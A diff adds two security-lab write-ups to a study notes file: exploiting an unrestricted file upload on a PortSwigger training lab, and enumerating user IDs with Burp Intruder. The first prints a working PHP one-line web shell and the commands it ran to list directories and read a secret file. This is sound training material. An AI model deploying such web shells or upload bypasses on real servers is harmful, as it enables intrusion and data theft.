@@ -1413,3 +1413,142 @@ This can be used to steal session cookies or perform actions as other users.
 - Understanding persistent XSS attacks
 - Understanding the difference between reflected and stored XSS
 
+---
+
+## Lab 23: File Upload Vulnerability and Remote Code Execution
+
+### Goal
+Understand how unrestricted file upload vulnerabilities can lead to remote code execution and system access.
+
+### Tools Used
+- Burp Suite
+- Firefox
+- Linux VM
+- PortSwigger Web Security Academy
+
+### Steps Performed
+
+1. Logged into PortSwigger Web Security Academy and accessed the File Upload lab.
+2. Navigated to "My Account" and located the avatar upload function.
+3. Uploaded a normal image first to observe the upload request.
+4. Intercepted the upload request in Burp Suite.
+
+Example upload request:
+```
+POST /my-account/avatar HTTP/1.1
+Content-Type: multipart/form-data
+
+Content-Disposition: form-data; name="avatar"; filename="image.jpg"
+Content-Type: image/jpeg
+```
+
+5. Created a PHP web shell file on the Linux VM:
+```
+<?php echo system($_GET['cmd']); ?>
+```
+
+6. Uploaded the PHP file as the avatar.
+7. Intercepted the upload request and modified the filename and content type to bypass restrictions.
+8. After upload, navigated to the uploaded file location.
+9. Executed system commands through the web shell using URL parameters:
+
+Examples:
+```
+shell.php?cmd=whoami
+shell.php?cmd=ls /
+shell.php?cmd=ls /home
+shell.php?cmd=ls /home/carlos
+shell.php?cmd=cat /home/carlos/secret
+```
+
+10. Located and read the secret file, completing the lab.
+
+### Observations
+
+- The server did not properly validate file uploads.
+- The server allowed a PHP file to be uploaded and executed.
+- This resulted in remote command execution on the server.
+- System enumeration was performed using Linux commands.
+
+### Concept Learned
+
+Unrestricted file upload vulnerabilities can allow attackers to upload executable files (web shells), leading to remote code execution.
+
+After gaining access, attackers perform enumeration to discover:
+- Users
+- Files
+- Sensitive data
+- System information
+
+### Skills Learned
+
+- Intercepting file upload requests
+- Modifying multipart/form-data requests
+- Uploading a web shell
+- Executing system commands through a web shell
+- Basic Linux enumeration commands
+
+---
+
+## Lab 24: Burp Intruder - ID Enumeration
+
+### Goal
+Use Burp Intruder to automate testing of multiple object IDs to identify valid resources.
+
+### Tools Used
+- Burp Suite Intruder
+- Firefox
+- https://jsonplaceholder.typicode.com
+
+### Steps Performed
+
+1. Intercepted request:
+```
+GET /users/1 HTTP/1.1
+Host: jsonplaceholder.typicode.com
+```
+
+2. Sent the request to Burp Intruder.
+3. Cleared default payload positions.
+4. Highlighted the user ID value and added a payload position:
+```
+GET /users/§1§ HTTP/1.1
+```
+
+5. Set payload type to Numbers:
+- From: 0
+- To: 10
+- Step: 1
+
+6. Started the Intruder attack.
+
+### Observations
+
+| ID | Status | Result |
+|----|--------|--------|
+| 0 | 304 | Cached response |
+| 1 | 304 | Cached response |
+| 2–10 | 200 | User data returned |
+
+- Multiple valid user IDs were discovered.
+- Different status codes indicated different server behavior.
+- Intruder successfully automated ID enumeration.
+
+### Concept Learned
+
+Intruder can be used to automate testing of many inputs to discover valid IDs, files, or parameters.
+
+This technique is commonly used to find:
+- Valid user IDs
+- Hidden files
+- Admin pages
+- Valid usernames
+- Valid parameters
+
+### Skills Learned
+
+- Using Burp Intruder
+- Setting payload positions
+- Automating parameter testing
+- Analyzing response differences
+
